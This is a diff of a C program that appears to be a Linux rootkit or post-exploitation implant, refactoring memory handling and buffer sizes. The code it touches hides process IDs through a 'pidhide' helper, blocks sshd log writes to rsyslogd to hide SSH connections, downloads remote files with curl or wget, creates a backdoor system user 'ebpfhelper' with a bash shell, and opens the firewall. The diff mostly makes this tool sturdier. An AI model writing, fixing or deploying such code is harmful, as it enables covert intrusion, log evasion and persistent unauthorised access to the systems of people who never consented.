@@ -18,9 +18,8 @@
 
 
 #define BUFFER_SIZE 512
+#define URL_SIZE 1024
 #define COMMAND_SIZE 256
-#define PID_STR_SIZE 64
-
 
 const char *sbin_path = "/usr/sbin/";
 const char *username = "ebpfhelper";
@@ -45,7 +44,7 @@ pid_t run_task_and_hide(const char *cmd) {
     } else if (pid > 0) { // Parent process
         pid_t hide_pid = fork();
         if (hide_pid == 0) { // Child process for hiding the PID
-            char hide_cmd[256];
+            char hide_cmd[COMMAND_SIZE];
             snprintf(hide_cmd, sizeof(hide_cmd), "%d", pid);
             execl("/usr/sbin/pidhide", "pidhide", "-p", hide_cmd, NULL);
             perror("execl"); // Executed only if execl fails
@@ -98,11 +97,13 @@ void find_pid_by_name(const char *program_name, int **found_pids) {
         buffer[strcspn(buffer, "\n")] = 0;
         int pid_count = 0;
         for (char *token = strtok(buffer, " "); token; token = strtok(NULL, " ")) {
-            *found_pids = realloc(*found_pids, (pid_count + 2) * sizeof(int));
-            if (!*found_pids) {
+            int *temp = realloc(*found_pids, (pid_count + 2) * sizeof(int));
+            if (!temp) {
                 perror("realloc");
+                free(*found_pids);
                 exit(1);
             }
+            *found_pids = temp;
             (*found_pids)[pid_count++] = atoi(token);
         }
         (*found_pids)[pid_count] = -1;
@@ -110,7 +111,6 @@ void find_pid_by_name(const char *program_name, int **found_pids) {
     pclose(fp);
 }
 
-// Function to hide PIDs
 void hide_pids(int *pids) {
     for (int i = 0; pids[i] != -1; ++i) {
         printf("Hiding PID: %d\n", pids[i]);
@@ -119,8 +119,10 @@ void hide_pids(int *pids) {
         
         pid_t hide_each_pid = fork();
         if (hide_each_pid == 0) {  // Child process
-            execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
-            exit(0);  // Exit child process
+            if (execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL) == -1) {
+                perror("execl");
+                exit(1);
+            }
         } else if (hide_each_pid < 0) {  // Fork failed
             perror("fork");
             exit(1);
@@ -136,13 +138,16 @@ void combine_and_hide_pids(const char *names[], int num_names) {
         int *found_pids = NULL;
         find_pid_by_name(names[i], &found_pids);
 
-        // Append found_pids to combined_pids
-        for (int j = 0; found_pids[j] != -1; ++j) {
-            combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
-            combined_pids[combined_count++] = found_pids[j];
-        }
+        // Only do if found_pids not NULL:w
+        if (found_pids) {
+            // Append found_pids to combined_pids
+            for (int j = 0; found_pids[j] != -1; ++j) {
+                combined_pids = realloc(combined_pids, (combined_count + 1) * sizeof(int));
+                combined_pids[combined_count++] = found_pids[j];
+            }
 
-        free(found_pids);  // Don't forget to free the memory
+            free(found_pids);  // Don't forget to free the memory
+        }
     }
 
     // Add the terminator
@@ -156,7 +161,7 @@ void combine_and_hide_pids(const char *names[], int num_names) {
 }
 
 void download_file(const char *local_path, const char *url) {
-    char cmd[1024];
+    char cmd[URL_SIZE];
     if (system("which curl") == 0) {
         snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
     } else if (system("which wget") == 0) {
@@ -219,7 +224,7 @@ void block_sshd_log() {
 
     // Block the write to rsyslogd (hide SSH connection)
     for (int i = 0; found_pids[i] != -1 ; ++i) {
-        char block_cmd[256];
+        char block_cmd[COMMAND_SIZE];
         snprintf(block_cmd, sizeof(block_cmd), "/usr/sbin/writeblocker --pid %d", found_pids[i]);
         run_task_and_hide(block_cmd);
     }
@@ -253,7 +258,7 @@ void allow_firewall() {
 }
 
 void add_system_user(const char *username) {
-    char cmd[256];
+    char cmd[COMMAND_SIZE];
 
     // Create a system user with home directory in /var/ and bash shell
     snprintf(cmd, sizeof(cmd), "useradd -r -m -d /var/%s -s /bin/bash %s", username, username);
@@ -388,8 +393,8 @@ int main(int argc, char *argv[]) {
         fclose(fp);
     }
     signal(SIGINT, handle_sigint);
-    //int found_pids[64];
-    //char cmd[1024];
+    //int found_pids[PID_STR_SIZE];
+    //char cmd[COMMAND_SIZE];
     char data[1024];
 
 
